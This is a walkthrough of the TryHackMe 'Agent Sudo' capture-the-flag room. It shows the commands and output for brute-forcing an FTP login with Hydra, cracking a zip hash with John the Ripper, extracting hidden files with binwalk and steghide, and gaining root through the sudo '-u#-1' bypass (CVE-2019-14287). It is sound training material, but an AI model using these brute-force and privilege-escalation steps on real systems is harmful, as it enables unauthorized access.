---
title: Agent Sudo
date: 2023-01-03
draft: false
tags: ['tryhackme', 'CTF', 'Writeup' ]
---

# Agent Sudo
{{< figure src="/agentsudo/agents.png" width=240px height=240px attr="You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth." >}}

___

[Agent Sudo](http://tryhackme.com/room/agentsudoctf), a CTF room with an alien theme!  

As always, we'll start with adding the target machine's IP address to our hosts file.

``` bash
echo target-ip agentsudo.thm >> /etc/hosts
```

Now lets move on to the room's tasks.

___

### Enumerate

We'll start by running an nmap scan of the target.

``` bash
nmap -sC -sV -T4 agentsudo.thm
```

``` bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-03 21:01 EST
Nmap scan report for agentsudo.thm (10.10.249.186)
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.17 seconds
```

That'll give us the answer to the first question: 
> "How many open ports?"   
> *3*.  

We see there's an Apache instance on port 80, so let's check out the webpage. 

{{< figure src="/agentsudo/ashome.png" link="/agentsudo/ashome.png" attr="agentsudo.thm" >}}

Now we have the answer for the second question:  
> "How you redirect yourself to a secret page?"  
> *user-agent*.  

Unfortunately I'm using Firefox, and switching user-agents on Firefox is a big pain so I'll be using Burpsuite. 
  
  
To do this we'll open Burp Proxy and intercept the connection to the homepage.  
We'll also change the "User-Agent" field to the provided codename from the homepage before forwarding the connection.

{{< figure src="/agentsudo/brpprxy.png" link="/agentsudo/brpprxy.png" attr="Burp Proxy Page" >}}


{{< figure src="/agentsudo/alert.png" link="/agentsudo/alert.png" attr="Alert!" >}}

Pay close attention to the header text, specifically the second sentence:  
> Are you one of the ***25*** employees?

It's possible the agent codenames may all be different letters, so we'll test that next.  
To do this I'll be running an instance of Burp Intruder set to Sniper, with a list of all the letters in the alphabet (minus "R") as the payload. [^1]

[^1]: It's possible (and faster in this case) to iterate through the alphabet manually *IF* you use a browser other than Firefox.

{{< figure src="/agentsudo/intruder.png" link="/agentsudo/intruder.png" attr="Intruder" >}}

{{< figure src="/agentsudo/payloadlist.png" link="/agentsudo/payloadlist.png" attr="Payload" >}}

After starting the attack we'll see that the letter "C" sends a redirect flag.  

{{< figure src="/agentsudo/results.png" link="/agentsudo/results.png" attr="Results" >}}

By forwarding that request through the proxy we'll then be met with this page:

{{< figure src="/agentsudo/attention.png" link="/agentsudo/attention.png" attr="Agent C" >}}

Which will answer the third question:  
> What is the agent name?  
> *chris*.

___

### Hash Cracking and Brute-Force

Now that we have a prospective username we can move on to cracking his ftp password.  
We'll use Hydra and the rockyou list to do this.

``` bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agentsudo.thm
```

``` bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-03 22:10:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://agentsudo.thm:21/
[21][ftp] host: agentsudo.thm   login: chris   password: *******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-03 22:11:28

```


> FTP password  
> `*******`

Now that we have agent C's ftp password we'll login to his account and see if there's anything interesting on the ftp server.

``` bash
ftp://chris:*******@agentsudo.thm
```

``` bash
Connected to agentsudo.thm.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||33502|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```
There's a few different files here, we'll download all of them and take a look.

``` bash
ftp> mget *
mget To_agentJ.txt [anpqy?]? a
```

``` bash
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||54940|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |*********************************|   217      311.63 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (1.05 KiB/s)
229 Entering Extended Passive Mode (|||7350|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |*********************************| 33143      160.33 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (80.84 KiB/s)
229 Entering Extended Passive Mode (|||42680|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |*********************************| 34842      167.63 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (84.88 KiB/s)
ftp> bye
221 Goodbye.
```
And we'll start with the the .txt file

``` bash
cat To_agentJ.txt
```

```
Dear agent J,

All these alien like photos are fake! 
Agent R stored the real picture inside your directory. 
Your login password is somehow stored in the fake picture. 
It shouldn't be a problem for you.

From,
Agent C
```
Agent C says the password is stored inside the fake picture, so we'll use binwalk to extract (-e) any hidden files.  
He doesn't specify which one, so we'll pass both of them to the tool.

``` bash
binwalk -e cute-alien.jpg cutie.png
```

``` bash
Scan Time:     2023-01-03 22:27:08
Target File:   /home/kali/Downloads/cute-alien.jpg
MD5 Checksum:  502df001346ac293b2d2cb4eeb5c57cc
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


Scan Time:     2023-01-03 22:27:08
Target File:   /home/kali/Downloads/cutie.png
MD5 Checksum:  7d0590aebd5dbcfe440c185160c73c9e
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': 
[Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```
There's nothing in the first one, but the "cutie.png" file seems to be hiding a password locked zip file!
To crack it, we'll use John the Ripper and its companion, zip2john.


``` bash
zip2john 8702.zip >> hash.txt
```

First, zip2john will extract the file's hash to 'hash.txt'


``` bash
john hash.txt --format=ZIP --wordlist=/usr/share/wordlists/rockyou.txt
```

Then, we'll call john with the ZIP format and use the rockyou list to crack the hash.


``` bash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*****            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2023-01-03 23:07) 4.347g/s 106852p/s 106852c/s 106852C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

After a few seconds we should have our password.

> ZIP file password  
> `*****`

Now we can extract and read the hidden text file.

``` bash
cat To_agentR.txt
```


``` 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

More secrets, it seems Agent R base64 encoded the steg password, so we'll decode it with the following command

``` bash
echo "QXJlYTUx" | base64 -d
```

> steg password  
> `******`

We'll then use that password to extract the hidden message in 'cute-alien.jpg' with steghide, a program used to hide data in jpgs and other file types. 

``` bash
steghide extract -p ****** -sf cute-alien.jpg
```

``` bash
wrote extracted data to "message.txt".
```
Once we read this text file, we'll finally have found Agent J's password.

```
Hi james,

Glad you find this message. Your login password is ************

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

___

### Capture the user flag

To find the user flag first we're going to ssh into the machine as james.

``` bash
ssh james@agentsudo.thm
```

Once we're logged in we can list the files in the current directory, which is where we'll find the user flag.

``` bash
cat user_flag.txt
```
> What is the user flag?   
> `********************************`

Then we'll log out of (or suspend) the connection so we can download the other file to our local machine.

``` bash
scp james@agentsudo.thm:Alien_autospy.jpg incident.jpg
```

{{< figure src="/agentsudo/incident.jpg" link="/agentsudo/incident.jpg" attr="Spooky!"  >}}

This is a pretty famous picture, and a quick reverse Google search will provide us with the 'name' of the incident in the photo.

> What is the incident of the photo called?  
> *Roswell alien autopsy*.

___

### Privilege escalation

Now that we have the user flag we can get started on finding the root flag.
First we'll check james' sudo privileges.

``` bash
sudo -l
```

``` bash
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
We can see that james can run sudo as ALL, but *not* root.

Next, we'll check the version of sudo as on older versions it can be made to bypass this restriction.

``` bash
sudo -V
```
``` bash
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Luckily this version is vulnerable to the bug, where calling sudo with a user id of "-1" automatically resolves to "0", or root.

``` bash
sudo -u#-1 /bin/bash
```

``` bash
whoami
root
```
Success! Now with root access we can find and print the root flag!

``` bash
find / -name root.txt
/root/root.txt
cat /root/root.txt
```

```
To Mr.hacker,

Congratulation on rooting this box. 
This box was designed for TryHackMe. 
Tips, always update your machine. 

Your flag is
********************************

By,
DesKel a.k.a Agent R
```
___

## Success!

We've found both flags! (And Agent R's real name!)
If you search CVE for the string "sudo runas ALL" you'll find the number for the vulnerability. 

> CVE number for the escalation?  
> *CVE-2019-14287*.

> What is the root flag?  
> `********************************`.


> (Bonus) Who is Agent R?  
> *DesKel*.



